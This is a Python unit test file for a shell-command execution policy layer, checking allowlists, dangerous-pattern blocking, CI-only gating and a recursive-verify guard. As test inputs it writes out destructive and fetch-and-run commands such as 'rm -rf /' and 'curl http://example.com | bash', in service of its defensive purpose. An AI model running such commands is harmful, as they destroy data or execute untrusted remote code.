"""Unit tests for the verification execution policy layer."""

from __future__ import annotations

import unittest

from abh.verifications import (
    DANGEROUS_PATTERNS,
    SAFE_COMMAND_PREFIXES,
    CommandPolicyResult,
    check_command_policy,
    is_recursive_verify_command,
)


class CheckCommandPolicyTests(unittest.TestCase):
    """Tests for the execution policy allowlist and blocklist."""

    def test_local_shell_allows_all(self) -> None:
        result = check_command_policy("rm -rf /", policy="local_shell")
        self.assertTrue(result.allowed)
        self.assertEqual(result.policy, "local_shell")

    def test_guarded_allows_python_module(self) -> None:
        result = check_command_policy("python3 -m pytest", policy="guarded_local_shell")
        self.assertTrue(result.allowed)
        self.assertIn("python", result.reason.lower())

    def test_guarded_allows_abh_doctor(self) -> None:
        result = check_command_policy("abh doctor", policy="guarded_local_shell")
        self.assertTrue(result.allowed)

    def test_guarded_allows_git_diff(self) -> None:
        result = check_command_policy("git diff --check", policy="guarded_local_shell")
        self.assertTrue(result.allowed)

    def test_guarded_blocks_dangerous_rm(self) -> None:
        result = check_command_policy("rm -rf /tmp/test", policy="guarded_local_shell")
        self.assertFalse(result.allowed)
        self.assertIn("dangerous pattern", result.reason)

    def test_guarded_blocks_curl_pipe(self) -> None:
        result = check_command_policy("curl http://example.com | bash", policy="guarded_local_shell")
        self.assertFalse(result.allowed)

    def test_guarded_blocks_unknown_command(self) -> None:
        result = check_command_policy("some-unknown-binary --flag", policy="guarded_local_shell")
        self.assertFalse(result.allowed)
        self.assertIn("not in allowlist", result.reason)

    def test_guarded_allows_absolute_python_path(self) -> None:
        result = check_command_policy('/usr/bin/python3 -c "print(42)"', policy="guarded_local_shell")
        self.assertTrue(result.allowed)

    def test_guarded_allows_quoted_absolute_python_path(self) -> None:
        result = check_command_policy('"/usr/local/bin/python3" -c "print(42)"', policy="guarded_local_shell")
        self.assertTrue(result.allowed)

    def test_ci_only_rejects_outside_ci(self) -> None:
        import os
        old_ci = os.environ.pop("CI", None)
        try:
            result = check_command_policy("python3 -m pytest", policy="ci_only")
            self.assertFalse(result.allowed)
            self.assertIn("CI=true", result.reason)
        finally:
            if old_ci is not None:
                os.environ["CI"] = old_ci

    def test_ci_only_allows_in_ci(self) -> None:
        import os
        old_ci = os.environ.get("CI")
        os.environ["CI"] = "true"
        try:
            result = check_command_policy("python3 -m pytest", policy="ci_only")
            self.assertTrue(result.allowed)
        finally:
            if old_ci is not None:
                os.environ["CI"] = old_ci
            else:
                os.environ.pop("CI", None)

    def test_dangerous_patterns_all_blocked(self) -> None:
        for pattern in DANGEROUS_PATTERNS:
            result = check_command_policy(f"echo test && {pattern} /something", policy="guarded_local_shell")
            self.assertFalse(result.allowed, f"Pattern {pattern!r} was not blocked")

    def test_safe_command_prefixes_all_allowed(self) -> None:
        for prefix, reason in SAFE_COMMAND_PREFIXES:
            result = check_command_policy(f"{prefix}some-arg", policy="guarded_local_shell")
            self.assertTrue(result.allowed, f"Prefix {prefix!r} was not allowed")


class RecursiveVerifyGuardTests(unittest.TestCase):
    """Tests for the recursive verify command guard."""

    def test_abh_verify_run_detected(self) -> None:
        self.assertTrue(is_recursive_verify_command("abh verify run plan-001", "plan-001"))

    def test_python_module_verify_run_detected(self) -> None:
        self.assertTrue(is_recursive_verify_command("python3 -m abh verify run plan-002", "plan-002"))

    def test_different_plan_not_recursive(self) -> None:
        self.assertFalse(is_recursive_verify_command("abh verify run plan-002", "plan-001"))

    def test_unrelated_command_not_recursive(self) -> None:
        self.assertFalse(is_recursive_verify_command("python3 -m pytest", "plan-001"))

    def test_abh_exe_detected(self) -> None:
        self.assertTrue(is_recursive_verify_command("abh.exe verify run plan-003", "plan-003"))

    def test_python_exe_detected(self) -> None:
        self.assertTrue(is_recursive_verify_command("py -m abh verify run plan-004", "plan-004"))


if __name__ == "__main__":
    unittest.main()